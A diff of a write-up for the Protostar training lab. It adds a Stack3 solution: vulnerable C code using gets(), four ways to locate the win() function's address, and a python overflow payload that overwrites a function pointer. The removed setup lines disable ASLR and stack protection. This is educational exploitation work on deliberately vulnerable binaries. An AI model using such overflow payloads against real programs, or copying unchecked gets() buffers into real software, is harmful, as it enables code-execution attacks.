@@ -1,21 +1,5 @@
 # Writeup Protostar2: Stack
 
-Check ASLR:
-```bash
-sysctl -a --pattern "randomize"
-```
-
-Disable ASLR temporarily:
-
-```bash
-sudo /sbin/sysctl -w kernel.randomize_va_space=0
-```
-
-Disable stack protection and make stack executable:
-```bash
-gcc -m32 -ggdb -fno-stack-protection -z execstack <source.c>
-```
-
 ## Stack0
 
 ```c
@@ -159,7 +143,7 @@ Starting program: /opt/protostar/bin/stack1 $(python -c "import sys; sys.stdout.
 you have correctly got the variable to the right value
 ```
 
-## Stack3
+## Stack2
 
 ```c
 #include <stdlib.h>
@@ -197,6 +181,106 @@ This time we can control the input via an environment variable. We can set an en
 ```bash
 $ export GREENIE=$(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x0A\x0D\x0A\x0D')")
 $ printenv GREENIE
-$ ./stack3
+$ ./stack2
 $ you have correctly modified the variable
+```
+
+## Stack3
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  volatile int (*fp)();
+  char buffer[64];
+
+  fp = 0;
+
+  gets(buffer);
+
+  if(fp) {
+      printf("calling function pointer, jumping to 0x%08x\n", fp);
+      fp();
+  }
+}
+```
+
+There are multiple ways of course to get the address of the `win` function.  
+In the following I will present four different ones:
+
+Obtain function address via `nm`
+```bash
+user@protostar:/opt/protostar/bin$ nm -a ./stack3 | grep win
+08048424 T win
+```
+
+Use `objdump` the get the address
+```bash
+user@protostar:/opt/protostar/bin$ objdump -Fd ./stack3 | grep win
+08048424 <win> (File Offset: 0x424):
+```
+
+If we only have the offset we can calculate the address ourself. We just have to add the offet to the base address of the module:
+> module's base address + function offset = function address
+
+```bash
+user@protostar:/opt/protostar/bin$ readelf -l ./stack3 | grep LOAD
+  LOAD           0x000000 0x08048000 0x08048000 0x00594 0x00594 R E 0x1000
+  LOAD           0x000594 0x08049594 0x08049594 0x00110 0x00118 RW  0x1000
+
+# 0x0804800 + 0x424 = 0x08048424
+```
+
+We can also use gdb to get the address
+```bash
+user@protostar:/opt/protostar/bin$ gdb -q ./stack3
+Reading symbols from /opt/protostar/bin/stack3...done.
+(gdb) break main
+Breakpoint 1 at 0x8048441: file stack3/stack3.c, line 16.
+(gdb) run
+Starting program: /opt/protostar/bin/stack3
+
+Breakpoint 1, main (argc=1, argv=0xbffff824) at stack3/stack3.c:16
+16      stack3/stack3.c: No such file or directory.
+        in stack3/stack3.c
+(gdb) info proc mapping
+process 3645
+cmdline = '/opt/protostar/bin/stack3'
+cwd = '/opt/protostar/bin'
+exe = '/opt/protostar/bin/stack3'
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack3
+         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack3
+        0xb7e96000 0xb7e97000     0x1000          0
+        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+        0xb7fd9000 0xb7fdc000     0x3000          0
+        0xb7fe0000 0xb7fe2000     0x2000          0
+        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+        0xbffeb000 0xc0000000    0x15000          0           [stack]
+(gdb) print win
+$1 = {void (void)} 0x8048424 <win>
+```
+
+The rest is the same as in previous challenges. Append the address to our payload pass it to stdin
+```bash
+user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 64 + '\x24\x84\x04\x08'" | ./stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
 ```
